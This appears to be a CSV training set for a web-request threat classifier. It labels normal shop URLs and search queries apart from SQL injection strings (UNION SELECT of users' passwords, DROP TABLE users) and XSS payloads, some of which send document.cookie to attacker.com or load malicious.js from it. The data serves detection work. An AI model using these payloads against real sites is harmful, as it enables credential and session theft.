text,label,threat_type
filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
about-us,0,NORMAL
login?user=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
usb c cable 2m,0,NORMAL
terms-and-conditions,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
product?id=102&category=electronics,0,NORMAL
api/search?term=usb+c+cable+2m,0,NORMAL
filter=1' ORDER BY 2--+,1,SQL_INJECTION
admin'/*,1,SQL_INJECTION
filter?category=usb+c+cable+2m&sort=desc,0,NORMAL
redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
"<video><source onerror=""javascript:alert(1)"">",2,XSS
search?q=admin_user_2024,0,NORMAL
search?q=<svg/onload=alert('XSS')>,2,XSS
help/return-policy,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
"search?q=""><script>alert(document.domain)</script>",2,XSS
filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
best headphones under 100,0,NORMAL
search?q=help/return-policy,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
assets/css/main.css,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
query=order/status?tracking=FEDEX-889922&page=1,0,NORMAL
item/cart/checkout?step=billing?ref=homepage,0,NORMAL
search?q=apple+macbook+pro+m2,0,NORMAL
search?q=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
search?q=download/specs-datasheet.pdf,0,NORMAL
search?q=<input autofocus onfocus=alert(1)>,2,XSS
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
api/search?term=alice.smith@example.com,0,NORMAL
browse?tag=assets/js/bundle.min.js,0,NORMAL
comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
login?user=' OR '1'='1,1,SQL_INJECTION
query=apple+macbook+pro+m2&page=1,0,NORMAL
login?user=1' ORDER BY 1--+,1,SQL_INJECTION
browse?tag=index.html,0,NORMAL
api/search?term=reviews?rating=5&verified=true,0,NORMAL
query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
comment=<select autofocus onfocus=alert(1)>,2,XSS
item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
"comment=<object data=""javascript:alert(1)"">",2,XSS
assets/css/main.css,0,NORMAL
login?user=' HAVING 1=1 --,1,SQL_INJECTION
<svg/onload=alert('XSS')>,2,XSS
<isindex type=image src=1 onerror=alert(1)>,2,XSS
<script>alert('XSS')</script>,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
api/search?term=usb+c+cable+2m,0,NORMAL
browse?tag=assets/js/bundle.min.js,0,NORMAL
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
search?q=admin_user_2024,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
search?q=<svg/onload=alert('XSS')>,2,XSS
1; DROP TABLE users--,1,SQL_INJECTION
"<video><source onerror=""javascript:alert(1)"">",2,XSS
1' ORDER BY 3--+,1,SQL_INJECTION
best headphones under 100,0,NORMAL
search?q=mechanical+pencil+0.5mm,0,NORMAL
query=profile/edit?name=Johnathan&page=1,0,NORMAL
"comment=""><script>alert(document.domain)</script>",2,XSS
filter?category=profile/edit?name=Johnathan&sort=desc,0,NORMAL
search?q=john_doe,0,NORMAL
api/search?term=product?id=102&category=electronics,0,NORMAL
filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
api/search?term=blog/post-10-cybersecurity-tips,0,NORMAL
catalog?page=2&sort=price_asc,0,NORMAL
dashboard?view=summary,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
product?id=102&category=electronics,0,NORMAL
"comment=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
<details open ontoggle=alert(1)>,2,XSS
search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
contact,0,NORMAL
search?q=<body onload=alert('XSS')>,2,XSS
query=contact&page=1,0,NORMAL
order/status?tracking=FEDEX-889922,0,NORMAL
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
assets/js/bundle.min.js,0,NORMAL
item/search?q=mechanical+pencil+0.5mm?ref=homepage,0,NORMAL
item?id=1' ORDER BY 1--+,1,SQL_INJECTION
search?q=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
search?q=apple+macbook+pro+m2,0,NORMAL
